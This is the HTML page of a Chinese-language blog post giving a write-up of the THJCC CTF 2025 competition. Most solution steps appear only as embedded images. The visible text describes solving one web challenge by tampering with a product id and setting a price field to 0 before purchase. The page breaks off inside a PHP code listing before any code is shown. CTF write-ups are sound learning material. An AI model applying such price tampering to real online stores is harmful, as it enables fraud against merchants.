<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="這是我第二次打 THJCC 其實中間還有一次THJCC winter是當出題者 但出的不好 程度太菜 還是當參賽者應該比較合適同時也在打資安女婕思初賽(輕鬆打~)，不過影響不大 user: THJCC_wangwww 高中生賽場 rk. 3總排 rk. 5  WarmUpWelcome beep boop beep boop Discord Challenge WebHeadlessPostman">
<meta property="og:type" content="article">
<meta property="og:title" content="THJCC CTF 2025 WriteUp">
<meta property="og:url" content="http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/index.html">
<meta property="og:site_name" content="wang&#39;s blog">
<meta property="og:description" content="這是我第二次打 THJCC 其實中間還有一次THJCC winter是當出題者 但出的不好 程度太菜 還是當參賽者應該比較合適同時也在打資安女婕思初賽(輕鬆打~)，不過影響不大 user: THJCC_wangwww 高中生賽場 rk. 3總排 rk. 5  WarmUpWelcome beep boop beep boop Discord Challenge WebHeadlessPostman">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/ByD7Uy31ge.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkZZUkhJxl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJCVmizJxg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJKhXoGyle.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hky-Nofygg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HyvkVsf1gg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1tXNjM1ll.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkE0Njf1ll.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HytTNoG1xl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B11gBjfyxg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1f8SjzJxe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1p_Hjfkxe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1CcSsz1ll.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkzeLsfyxx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/By1M8oG1xe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hy4jUsM1ex.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJVBUiG1xl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B10S8sGyge.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJXwLjzkxg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJF9Ujf1lg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJh0LofJll.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1f6Uszkxl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJNZDjf1gg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkImwjGyge.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HksPPiGyll.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkFdPsG1xl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJ03PjMJxl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkXCPsG1ll.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJD-_sMJll.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJw55ozkxl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1OljiGJex.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkPZsifyxx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkrTEnGkex.png">
<meta property="og:image" content="https://hackmd.io/_uploads/r1R6QnzJlx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkciN2zJgg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkM2ShfJex.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BymNrhfkxe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Bk6882zyxl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/r1fcLhfkgl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1Gp82f1xe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S16JwnGJle.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkrlD3Gylg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1JGd2fkxg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S127_hGyxx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryjDunMkex.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJ5u2hf1gl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJT7anGJgx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1lKahGJle.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJ5pAhfJel.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ByvXJpfkgx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJT1laGJeg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJ8xV071ex.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hyx3LC71xe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rkkYugVkxx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryyLs0Qkge.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1DIb1V1xx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryWD-y4klg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkNibl4Jex.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Bkig8xNygg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Bk2iLgN1gg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJ1PKg4yel.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hy97olN1xg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJK6pxN1gg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/r1WN3e4ygg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryWF3lEklx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Sk8RwxEkel.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rydVYjV1ee.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkhdAo4kxg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rkg8-2Ekgg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SytL-n4yle.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryfiW3Vkgg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Sywnm2Vyel.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HyQD33V1lg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJ2rhhEJxe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HyZ6m2iJgx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B19KH0EJlg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hy1iXhjJgl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJH4wR4Jxl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryxXy2oJxg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1rYyhoJgx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkZ0JhjJge.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hypzg3sJex.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJlvx3sJll.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1Ypl2oygx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HyoJZhjJgx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hk2R72i1gx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rkmtE2jkxe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyrUB2i1ge.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJ2DUns1ex.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkCm_3i1ex.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJmMd2oylg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hkb_u3iyle.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkQL52oyll.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hyyia2syxl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkAkA2skge.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkgPWpjkgx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rklJ4Tj1ex.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rkSnzToklx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1zTf6s1lx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkAAW6oyle.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJzEvai1le.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJzPwpokgl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkV8dTokeg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkguuTokxg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyfAcTi1xx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJRBsTi1gg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkCijpi1gg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJMzhpsJxg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJ4ZXRs1eg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1fCNAiyeg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1MwSCsJxe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rkm4IAskle.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Byts80jkgg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S12jdCsyll.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkPCO0i1gl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1SNa0jkeg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ry4h5Ajkee.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BygtTAoJxx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/By5si0j1gx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Sk6Z3RjJgg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJl9OzJn1ge.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyZD5Co1xl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkZazk21gx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJYJQ13Jee.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJDGVJ31xx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1o_mLxxex.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkG6NIllgx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rymgSLgxee.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJkltUxlle.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkQjYIgeeg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJTiQIglge.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyTMyvgelx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HymG1wgxee.png">
<meta property="og:image" content="https://hackmd.io/_uploads/r1Es7jegge.png">
<meta property="og:image" content="https://hackmd.io/_uploads/r1FIBjxxxg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJYFBjgxex.png">
<meta property="og:image" content="https://hackmd.io/_uploads/r1bpHslgll.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJpBKCWgee.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rk9nrCZlee.png">
<meta property="og:image" content="https://hackmd.io/_uploads/By2Hn4Mxex.png">
<meta property="article:published_time" content="2025-05-01T16:00:00.000Z">
<meta property="article:modified_time" content="2025-05-02T13:03:43.339Z">
<meta property="article:author" content="wang">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="THJCC">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/ByD7Uy31ge.png">
    
    
    <!-- title -->
    <title>THJCC CTF 2025 WriteUp</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-86660611-1');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tag/">Tag</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/05/02/SunshineCTF-2024-WriteUp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/03/18/picoCTF-2025-WriteUp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&text=THJCC CTF 2025 WriteUp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&title=THJCC CTF 2025 WriteUp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&is_video=false&description=THJCC CTF 2025 WriteUp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=THJCC CTF 2025 WriteUp&body=Check out this article: http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&title=THJCC CTF 2025 WriteUp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&title=THJCC CTF 2025 WriteUp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&title=THJCC CTF 2025 WriteUp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&title=THJCC CTF 2025 WriteUp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&name=THJCC CTF 2025 WriteUp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&t=THJCC CTF 2025 WriteUp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#WarmUp"><span class="toc-number">1.</span> <span class="toc-text">WarmUp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Welcome"><span class="toc-number">1.1.</span> <span class="toc-text">Welcome</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#beep-boop-beep-boop"><span class="toc-number">1.2.</span> <span class="toc-text">beep boop beep boop</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Discord-Challenge"><span class="toc-number">1.3.</span> <span class="toc-text">Discord Challenge</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Headless"><span class="toc-number">2.1.</span> <span class="toc-text">Headless</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nothing-here-%F0%9F%91%80"><span class="toc-number">2.2.</span> <span class="toc-text">Nothing here 👀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#APPL3-STOR3%F0%9F%8D%8E"><span class="toc-number">2.3.</span> <span class="toc-text">APPL3 STOR3🍎</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Lime-Ranger"><span class="toc-number">2.4.</span> <span class="toc-text">Lime Ranger</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#network-noise"><span class="toc-number">3.1.</span> <span class="toc-text">network noise</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Seems-like-someone%E2%80%99s-breaking-down%F0%9F%98%82"><span class="toc-number">3.2.</span> <span class="toc-text">Seems like someone’s breaking down😂</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Setsuna-Message"><span class="toc-number">3.3.</span> <span class="toc-text">Setsuna Message</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hidden-in-memory%E2%80%A6"><span class="toc-number">3.4.</span> <span class="toc-text">Hidden in memory…</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pyjail02"><span class="toc-number">3.5.</span> <span class="toc-text">Pyjail02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pyjail01"><span class="toc-number">3.6.</span> <span class="toc-text">Pyjail01</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn"><span class="toc-number">4.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Flag-Shopping"><span class="toc-number">4.1.</span> <span class="toc-text">Flag Shopping</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Money-Overflow"><span class="toc-number">4.2.</span> <span class="toc-text">Money Overflow</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Shell"><span class="toc-number">4.3.</span> <span class="toc-text">Insecure Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Once"><span class="toc-number">4.4.</span> <span class="toc-text">Once</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Little-Parrot"><span class="toc-number">4.5.</span> <span class="toc-text">Little Parrot</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Twins"><span class="toc-number">5.1.</span> <span class="toc-text">Twins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DAES"><span class="toc-number">5.2.</span> <span class="toc-text">DAES</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Frequency-Freakout"><span class="toc-number">5.3.</span> <span class="toc-text">Frequency Freakout</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SNAKE"><span class="toc-number">5.4.</span> <span class="toc-text">SNAKE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Yoshino%E2%80%99s-Secret"><span class="toc-number">5.5.</span> <span class="toc-text">Yoshino’s Secret</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Speeded-Block-Cipher"><span class="toc-number">5.6.</span> <span class="toc-text">Speeded Block Cipher</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse"><span class="toc-number">6.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A5%BF"><span class="toc-number">6.1.</span> <span class="toc-text">西</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#time-GEM"><span class="toc-number">6.2.</span> <span class="toc-text">time_GEM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-Hunter-%F0%9F%90%8D"><span class="toc-number">6.3.</span> <span class="toc-text">Python Hunter 🐍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flag-Checker"><span class="toc-number">6.4.</span> <span class="toc-text">Flag Checker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Noo-dle"><span class="toc-number">6.5.</span> <span class="toc-text">Noo dle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Empty"><span class="toc-number">6.6.</span> <span class="toc-text">Empty</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Demon-Summoning"><span class="toc-number">6.7.</span> <span class="toc-text">Demon Summoning</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Feedback"><span class="toc-number">7.</span> <span class="toc-text">Feedback</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B3%BD%E5%BE%8C%E8%A7%A3%E5%87%BA"><span class="toc-number">8.</span> <span class="toc-text">賽後解出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#web-proxy-under-development"><span class="toc-number">8.1.</span> <span class="toc-text">(web) proxy | under_development</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-iCloud%E2%98%81%EF%B8%8F"><span class="toc-number">8.2.</span> <span class="toc-text">(web) iCloud☁️</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn-Bank-Clerk"><span class="toc-number">8.3.</span> <span class="toc-text">(pwn)Bank Clerk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#crypto-Proactive-Planning"><span class="toc-number">8.4.</span> <span class="toc-text">(crypto) Proactive Planning</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        THJCC CTF 2025 WriteUp
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wang</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-05-01T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-05-02</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/THJCC/" rel="tag">THJCC</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>這是我第二次打 THJCC <del>其實中間還有一次THJCC winter是當出題者 但出的不好 程度太菜 還是當參賽者應該比較合適</del><br>同時也在打資安女婕思初賽(輕鬆打~)，不過影響不大</p>
<p>user: THJCC_wangwww</p>
<p>高中生賽場 rk. 3<br>總排 rk. 5</p>
<p><img src="https://hackmd.io/_uploads/ByD7Uy31ge.png" alt="image"><br><img src="https://hackmd.io/_uploads/HkZZUkhJxl.png" alt="image"><br><img src="https://hackmd.io/_uploads/SJCVmizJxg.png" alt="image"></p>
<h3 id="WarmUp"><a href="#WarmUp" class="headerlink" title="WarmUp"></a>WarmUp</h3><h4 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h4><p><img src="https://hackmd.io/_uploads/SJKhXoGyle.png" alt="image"></p>
<h4 id="beep-boop-beep-boop"><a href="#beep-boop-beep-boop" class="headerlink" title="beep boop beep boop"></a>beep boop beep boop</h4><p><img src="https://hackmd.io/_uploads/Hky-Nofygg.png" alt="image"><br><img src="https://hackmd.io/_uploads/HyvkVsf1gg.png" alt="image"><br><img src="https://hackmd.io/_uploads/B1tXNjM1ll.png" alt="image"></p>
<h4 id="Discord-Challenge"><a href="#Discord-Challenge" class="headerlink" title="Discord Challenge"></a>Discord Challenge</h4><p><img src="https://hackmd.io/_uploads/BkE0Njf1ll.png" alt="image"><br><img src="https://hackmd.io/_uploads/HytTNoG1xl.png" alt="image"><br><img src="https://hackmd.io/_uploads/B11gBjfyxg.png" alt="image"></p>
<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Headless"><a href="#Headless" class="headerlink" title="Headless"></a>Headless</h4><p><img src="https://hackmd.io/_uploads/H1f8SjzJxe.png" alt="image"><br><img src="https://hackmd.io/_uploads/S1p_Hjfkxe.png" alt="image"><br><img src="https://hackmd.io/_uploads/H1CcSsz1ll.png" alt="image"><br>Postman<br><img src="https://hackmd.io/_uploads/HkzeLsfyxx.png" alt="image"><br><img src="https://hackmd.io/_uploads/By1M8oG1xe.png" alt="image"></p>
<h4 id="Nothing-here-👀"><a href="#Nothing-here-👀" class="headerlink" title="Nothing here 👀"></a>Nothing here 👀</h4><p><img src="https://hackmd.io/_uploads/Hy4jUsM1ex.png" alt="image"><br><img src="https://hackmd.io/_uploads/HJVBUiG1xl.png" alt="image"><br><img src="https://hackmd.io/_uploads/B10S8sGyge.png" alt="image"><br><img src="https://hackmd.io/_uploads/BJXwLjzkxg.png" alt="image"></p>
<h4 id="APPL3-STOR3🍎"><a href="#APPL3-STOR3🍎" class="headerlink" title="APPL3 STOR3🍎"></a>APPL3 STOR3🍎</h4><p><img src="https://hackmd.io/_uploads/BJF9Ujf1lg.png" alt="image"><br><img src="https://hackmd.io/_uploads/rJh0LofJll.png" alt="image"><br>中間的<br><img src="https://hackmd.io/_uploads/H1f6Uszkxl.png" alt="image"><br>右邊的<br><img src="https://hackmd.io/_uploads/BJNZDjf1gg.png" alt="image"><br>id 跳過 87<br><img src="https://hackmd.io/_uploads/BkImwjGyge.png" alt="image"><br><img src="https://hackmd.io/_uploads/HksPPiGyll.png" alt="image"><br>Product_Prices 改 0<br><img src="https://hackmd.io/_uploads/HkFdPsG1xl.png" alt="image"><br>再點立即購買<br><img src="https://hackmd.io/_uploads/HJ03PjMJxl.png" alt="image"></p>
<h4 id="Lime-Ranger"><a href="#Lime-Ranger" class="headerlink" title="Lime Ranger"></a>Lime Ranger</h4><p><img src="https://hackmd.io/_uploads/HkXCPsG1ll.png" alt="image"><br><img src="https://hackmd.io/_uploads/HJD-_sMJll.png" alt="image"><br><code>http://chal.ctf.scint.org:8004/?view</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 